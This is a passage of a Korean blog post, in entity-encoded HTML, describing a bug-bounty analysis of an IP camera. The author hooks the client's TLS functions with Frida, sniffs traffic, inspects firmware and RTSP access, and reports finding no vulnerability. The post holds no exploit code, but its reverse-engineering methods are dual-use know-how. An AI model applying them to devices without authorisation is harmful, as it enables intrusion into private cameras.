&#xD30C;&#xC545;&#xD55C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC544;&#xC694;.</p><ul><li>Wifi (AP)</li><li><strong>App (iOS/Android &#x2192; IP CAM)</strong></li><li><strong>Windows program</strong></li><li>External cloud storage</li><li>Ethernet</li><li>SDCard</li><li>USB</li></ul><p>&#xCD5C;&#xADFC; IP CAM &#xB4E4;&#xC740; &#xC704; &#xC5B8;&#xAE09;&#xD55C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC911; &#xB300;&#xBD80;&#xBD84;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC0B4;&#xC9DD; &#xBE44;&#xC2B7;&#xD55C; &#xB290;&#xB08C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC628;&#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xD68D;&#xB4DD; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0;&#xB97C; &#xACE0;&#xB824;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; 4&#xAC1C;&#xC758; &#xC791;&#xACE0; &#xADC0;&#xC5EC;&#xC6B4; IP CAM&#xB4E4;&#xC744; &#xAD6C;&#xB9E4;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; 2&#xAC1C; IP CAM&#xC758; &#xBD84;&#xC11D; &#xD6C4;&#xAE30;&#xB97C; &#xC18C;&#xAC1C;&#xD560;&#xAC8C;&#xC694;.</p><h1 id="Target-A"><a href="#Target-A" class="headerlink" title="Target A"></a>Target A</h1><h2 id="1-Initial-exploration"><a href="#1-Initial-exploration" class="headerlink" title="#1 - Initial exploration"></a>#1 - Initial exploration</h2><p>Target A&#xC758; &#xC0AC;&#xC6A9;&#xC790; interface&#xC5D0;&#xB294; App (iOS / Android)&#xC640; Windows EXE&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xCD08;&#xAE30; &#xBD84;&#xC11D;&#xC744; &#xC218;&#xD589;&#xD55C; &#xB0B4;&#xC6A9;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>App<ul><li>&#xD68C;&#xC6D0;&#xAC00;&#xC785;/&#xB85C;&#xADF8;&#xC778;&#xC774; &#xD544;&#xC218;&#xC774;&#xACE0;, App &#x2192; &#xC11C;&#xBC84;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC784;</li><li>&#xAE30;&#xAE30; &#xB4F1;&#xB85D; &#xC2DC; App&#xC758; QR code&#xB97C; &#xAE30;&#xAE30;&#xC5D0; &#xC778;&#xC2DD;&#xC2DC;&#xCF1C;&#xC57C; &#xD558;&#xBA70;, &#xC5EC;&#xAE30;&#xC5D0;&#xB294; Wi-Fi &#xC811;&#xC18D; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB428;</li><li>&#xAE30;&#xAE30; &#xB4F1;&#xB85D; &#xC644;&#xB8CC; &#xD6C4; &#xC601;&#xC0C1; &#xC2DC;&#xCCAD;&#xC774; &#xAC00;&#xB2A5;&#xD568;</li></ul></li><li>Windows &#xD504;&#xB85C;&#xADF8;&#xB7A8;<ul><li>&#xD68C;&#xC6D0;&#xAC00;&#xC785;/&#xB85C;&#xADF8;&#xC778;&#xD560; &#xACBD;&#xC6B0;, EXE &#x2192; &#xC11C;&#xBC84;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC784;</li><li>&#xB85C;&#xADF8;&#xC778; &#xC774;&#xD6C4; LAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD0D0;&#xC0C9;&#xD568;. &#xAE30;&#xAE30; &#xB4F1;&#xB85D;&#xC740; &#xAE30;&#xAE30;&#xC758; &#xC2DC;&#xB9AC;&#xC5BC; &#xBC88;&#xD638;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;</li><li>&#xB85C;&#xADF8;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; LAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xAE30;&#xAE30;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xC601;&#xC0C1;&#xC744; &#xC2DC;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC74C;</li></ul></li><li>&#xC778;&#xD130;&#xB137;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xBE14;&#xB85C;&#xADF8; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xD38C;&#xC6E8;&#xC5B4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC29;&#xBC95; &#xC54C;&#xC544;&#xB0C4;<ul><li>&#xACF5;&#xC2DD; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; <code>/device/{device-model}/{device-model}</code> &#xD615;&#xD0DC;&#xC758; URL &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xAC00;&#xB2A5;</li><li><code>binwalk</code> &#xC774;&#xC6A9;&#xD574; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB2C8; <code>squashfs</code> &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574; &#xD30C;&#xC77C; &#xCD94;&#xCD9C;&#xD568;</li></ul></li></ul><h2 id="2-Windows-EXE-analysis"><a href="#2-Windows-EXE-analysis" class="headerlink" title="#2 - Windows EXE analysis"></a>#2 - Windows EXE analysis</h2><p>Windows &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xAC83;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB824; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xBA74; &#xC11C;&#xBC84;&#xC640; &#xC5B4;&#xB5A4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0; &#xBC1B;&#xB294;&#xC9C0;?</li><li>&#xC601;&#xC0C1; &#xC2DC;&#xCCAD; &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xBA74; &#xC11C;&#xBC84; / IP CAM&#xACFC; &#xC5B4;&#xB5A4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xD558;&#xB294;&#xC9C0;?</li></ul><p>&#xC6B0;&#xC120; Wireshark&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xB3C4;&#xD588;&#xC5B4;&#xC694;.</p><ul><li>TLS &#xC554;&#xD638;&#xD654; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC2DD; &#xAC00;&#xB2A5;&#xD55C; &#xD328;&#xD0B7;&#xC774; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; <code>SSLKEYLOGFILE</code>&#xB97C; &#xCD94;&#xCD9C;&#xD574; Wireshark&#xC5D0;&#xC11C; TLS &#xD328;&#xD0B7;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB4EF;&#xC774;, &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; TLS &#xB85C;&#xC9C1;&#xC744; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xD574; Key &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; TLS &#xAD6C;&#xC870; &#xD30C;&#xC545;&#xD574;&#xC11C; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC5B4;&#xB824;&#xC6CC; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB2E4;&#xD589;&#xD788; &#xC774;&#xC804;&#xC5D0; Frida &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBCF8; &#xACBD;&#xD5D8;&#xC774; &#xC788;&#xC5C8;&#xACE0;, Frida&#xB97C; &#xC774;&#xC6A9;&#xD574; SSL &#xAD00;&#xB828; &#xC554;&#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xB4E4;&#xC744; Hooking &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Windows EXE&#xC5D0;&#xC11C; Import&#xD558;&#xB294; SSL &#xAD00;&#xB828; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xC2DD;&#xBCC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xD568;&#xC218;&#xC758; argument &#xAC12; &#xB610;&#xB294; return buffer&#xB97C; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xACB0;&#xACFC;&#xB97C; &#xCC38;&#xACE0;&#xD574; &#xC801;&#xC808;&#xD788; &#xCD9C;&#xB825;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB978;&#xCABD; &#xC0AC;&#xC9C4;&#xC744; &#xBCF4;&#xBA74;, HTTP 200&#xC774; &#xBCF4;&#xC774;&#xB124;&#xC694;!</li></ul><p><img src="image%201.png" alt="image.png"></p><p>Frida Hooking &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; Windows EXE &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC744; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-Watching-video-after-user-login-WAN-network"><a href="#2-1-Watching-video-after-user-login-WAN-network" class="headerlink" title="#2.1 - Watching video after user login (WAN network)"></a>#2.1 - Watching video after user login (WAN network)</h3><p>Windows &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; IP CAM&#xC774; &#xAC19;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC788;&#xC9C0; &#xC54A;&#xC740; WAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294;, &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xC11C;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xB85C; &#xD1B5;&#xC2E0;&#xD574;&#xC694;.</p><ul><li>TLS &#xBCF5;&#xD638;&#xD654;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xB098;&#xBA74;, &#xC11C;&#xBC84;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC804;&#xB2EC;&#xD574;&#xC694;.</li><li>&#xC778;&#xC99D;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC11C;&#xBC84;&#xAC00; &#xC601;&#xC0C1; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF4;&#xB0B4;&#xC90D;&#xB2C8;&#xB2E4;.</li></ul><p><img src="image%202.png" alt="image.png"></p><p>&#xADF8;&#xB7EC;&#xB098; IP CAM&#xACFC; server&#xAC00; &#xC8FC;&#xACE0; &#xBC1B;&#xB294; TLS 1.2&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xAC00; &#xBD88;&#xAC00;&#xD588;&#xC5B4;&#xC694;. TLS 1.2 &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; &#xACBD;&#xC6B0; Cipher suite&#xAC00; RSA&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xBA87;&#xBA87; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC54C;&#xB824;&#xC838; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;, &#xBD84;&#xC11D; &#xB300;&#xC0C1; IP CAM&#xC758; Cipher suite&#xB294; <code>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code>&#xB85C; MITM &#xACF5;&#xACA9;&#xC774; &#xBD88;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="See-also-Packet-sniffing-with-Wi-Fi-dongle"><a href="#See-also-Packet-sniffing-with-Wi-Fi-dongle" class="headerlink" title="[See also] Packet sniffing with Wi-Fi dongle"></a>[See also] Packet sniffing with Wi-Fi dongle</h3><p>IP CAM&#xACFC; &#xC11C;&#xBC84;&#xAC00; &#xC8FC;&#xACE0; &#xBC1B;&#xB294; &#xD328;&#xD0B7;&#xC744; &#xCEA1;&#xCCD0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Wi-Fi dongle&#xC744; &#xC774;&#xC6A9;&#xD588;&#xC5B4;&#xC694;. Dongle&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; Wi-Fi &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xB294; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; Wi-Fi&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;&#xC694;. &#xC6B0;&#xB9AC;&#xB294; &#xBC18;&#xB300;&#xB85C; PC&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC774;&#xB354;&#xB137;&#xC744; Wi-Fi&#xB85C; &#xBFCC;&#xB824;&#xC8FC;&#xAE30; &#xC704;&#xD55C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; dongle&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>&#xC544;&#xB798; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; dongle&#xC774; &#xACF5;&#xC720;&#xAE30;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li><li>Wireshark&#xC5D0;&#xC11C; dongle &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC120;&#xD0DD;&#xD574; &#xCEA1;&#xCCD0;&#xD558;&#xBA74;, IP CAM&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xD328;&#xD0B7;&#xC774; &#xCEA1;&#xCCD0; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</li></ul><p><img src="image%203.png" alt="image.png"></p><h3 id="2-2-Watching-video-after-user-login-LAN-network"><a href="#2-2-Watching-video-after-user-login-LAN-network" class="headerlink" title="#2.2 - Watching video after user login (LAN network)"></a>#2.2 - Watching video after user login (LAN network)</h3><p>&#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB85C;&#xC9C1;&#xC740; LAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Windows EXE&#xC640; IP CAM&#xC774; LAN encrypt key&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD574; &#xC8FC;&#xACE0; &#xBC1B;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC744; &#xB54C;, &#xC800;&#xB294; &#xB2F9;&#xC5F0;&#xD788; &#xACE0;&#xC815;&#xD0A4;&#xB97C; &#xC774;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; Target A&#xB97C; &#xB108;&#xBB34; &#xC595;&#xBD24;&#xB358; &#xAC83;&#xC774;&#xC8E0;,,,</p><p>&#xC544;&#xB798; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790; &#xB85C;&#xADF8;&#xC778; &#xC2DC; &#xC11C;&#xBC84;&#xAC00; JWT Token&#xC744; &#xBC1C;&#xAE09;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; LAN encrypt key&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. Server&#xC640; IP CAM &#xAC04;&#xC5D0;&#xB3C4; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; LAN encrypt key&#xAC00; &#xC804;&#xB2EC;&#xB420; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%204.png" alt="image.png"></p><h3 id="2-3-Watching-video-with-no-user-login-LAN-network"><a href="#2-3-Watching-video-with-no-user-login-LAN-network" class="headerlink" title="#2.3 - Watching video with no user login (LAN network)"></a>#2.3 - Watching video with no user login (LAN network)</h3><p>Target A&#xC5D0;&#xC11C;&#xB294; &#xB85C;&#xADF8;&#xC778; &#xC5C6;&#xC774; LAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xAE30;&#xAE30;&#xB97C; &#xC2A4;&#xCE94;&#xD574; &#xC601;&#xC0C1;&#xC744; &#xC2DC;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC601;&#xC0C1; &#xC2DC;&#xCCAD;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Windows EXE&#xC5D0;&#xC11C;&#xB294; &#xD55C; &#xBC88; &#xC131;&#xACF5;&#xD55C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xCE90;&#xC2F1;&#xD574;&#xC11C; &#xB2E4;&#xC74C;&#xBD80;&#xD130;&#xB294; &#xBCC4;&#xB3C4;&#xB85C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBB3C;&#xC5B4;&#xBCF4;&#xC9C0; &#xC54A;&#xAE30;&#xB3C4; &#xD558;&#xB294;&#xB370;, &#xC800;&#xB294; &#xADF8;&#xAC78; &#xC78A;&#xC5B4;&#xBC84;&#xB824; &#xC81C;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xB2E4;&#xACE0; &#xCC29;&#xAC01;&#xD588;&#xC5C8;&#xC8E0;. &#xBCF4;&#xACE0;&#xC11C; &#xC791;&#xC131; &#xC9C1;&#xC804;&#xAE4C;&#xC9C0; &#xAC00;&#xC11C;&#xC57C; &#xBB34;&#xC5B8;&#xAC00; &#xC798;&#xBABB;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xAE68;&#xB2EC;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;..</li></ul><p><img src="image%205.png" alt="image.png"></p><h3 id="2-4-Watching-video-with-no-user-login-RTSP-protocol"><a href="#2-4-Watching-video-with-no-user-login-RTSP-protocol" class="headerlink" title="#2.4 - Watching video with no user login (RTSP protocol)"></a>#2.4 - Watching video with no user login (RTSP protocol)</h3><p>Target A&#xB294; RTSP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB3C4; &#xC9C0;&#xC6D0;&#xD588;&#xB294;&#xB370;&#xC694;. RTSP(Real Time Streaming Protocol)&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xC624;&#xB514;&#xC624;, &#xBE44;&#xB514;&#xC624;, &#xB370;&#xC774;&#xD130; &#xB4F1;&#xC758; &#xBA40;&#xD2F0;&#xBBF8;&#xB514;&#xC5B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC778;&#xD130;&#xB137; &#xBE14;&#xB85C;&#xADF8; &#xAC8C;&#xC2DC;&#xAE00;&#xC744; &#xD1B5;&#xD574; Target A&#xC758; RTSP URL&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>&#xACFC;&#xAC70; &#xBC84;&#xC804;&#xC758; Target A&#xC5D0;&#xC11C;&#xB294; <strong>6&#xC790;&#xB9AC;&#xC758; device code&#xB97C; RTSP &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB85C; &#xC774;&#xC6A9;</strong>&#xD588;&#xC73C;&#xB098;, &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xAE30; &#xB4F1;&#xB85D; &#xC2DC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="image%206.png" alt="image.png"></p><h2 id="3-API-server"><a href="#3-API-server" class="headerlink" title="#3 - API server"></a>#3 - API server</h2><p>Frida&#xB85C; Windows EXE&#xB97C; hooking&#xD558;&#xB2E4;&#xAC00; API &#xC11C;&#xBC84;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xC5B4;&#xC694;. Windows &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB3D9;&#xC77C; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC;, &#xBB34;&#xB824; Internet explorer&#xC5D0;&#xC11C;&#xB9CC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; !!! &#xC544;&#xC8FC; &#xD5C8;&#xB984;&#xD55C; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC600;&#xC8E0;. Windows &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD68C;&#xC6D0; &#xAC00;&#xC785;, &#xAE30;&#xAE30; &#xB4F1;&#xB85D;, &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xBCC0;&#xACBD; &#xB4F1; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA87;&#xBA87; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xACE0;&#xBBFC;&#xD558;&#xB358; &#xC911;, &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xAE68;&#xB2EB;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xBA48;&#xCDC4;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><h2 id="4-Firmware-analysis"><a href="#4-Firmware-analysis" class="headerlink" title="#4 - Firmware analysis"></a>#4 - Firmware analysis</h2><p>&#xBD84;&#xC11D; &#xCD08;&#xAE30;&#xC5D0; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD68D;&#xB4DD;&#xD588;&#xB2E4;&#xACE0; &#xC5B8;&#xAE09;&#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBD80;&#xBD84;&#xB4E4;&#xC744; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD588;&#xC73C;&#xB098; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Command Injection: &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC788;&#xC5B4; &#xD574;&#xB2F9; &#xBD80;&#xBD84; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD588;&#xC73C;&#xB098; &#xC2E4;&#xD328;</li><li>BOF / DOS attack: &#xC0AC;&#xC6A9;&#xC790; request &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; length &#xAC80;&#xC99D;&#xC744; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD24;&#xB294;&#xB370;, &#xBCC4;&#xB3C4;&#xB85C; &#xCC3E;&#xC9C0; &#xBABB;&#xD588;&#xC74C;</li></ul><h2 id="5-Result"><a href="#5-Result" class="headerlink" title="#5 - Result"></a>#5 - Result</h2><p>Target A&#xC5D0;&#xC11C;&#xB294; Windows EXE &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xBCC4; &#xB85C;&#xC9C1;&#xC744; &#xC8FC;&#xB85C; &#xBD84;&#xC11D;&#xD588;&#xB294;&#xB370;&#xC694;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218;&#xAC00; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Target A&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC740;, &#xC774;&#xBBF8; &#xB9CE;&#xC740; &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC744; &#xAC70;&#xCCD0;&#xAC04; &#xAC78;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><h1 id="2&#xC5D0;&#xC11C;-&#xBD84;&#xC11D;&#xD55C;-4&#xAC00;&#xC9C0;-&#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0;-&#xB300;&#xD574;-&#xC548;&#xC804;&#xD55C;-&#xC554;&#xD638;&#xD654;-&#xBC29;&#xBC95;&#xC744;-&#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;-&#xCC98;&#xC74C;&#xBD80;&#xD130;-&#xC774;&#xB807;&#xAC8C;-&#xC124;&#xACC4;&#xD588;&#xC744;-&#xAC70;&#xB77C;&#xACE0;&#xB294;-&#xC808;&#xB300;-&#xC0DD;&#xAC01;&#xD558;&#xC9C0;-&#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;"><a 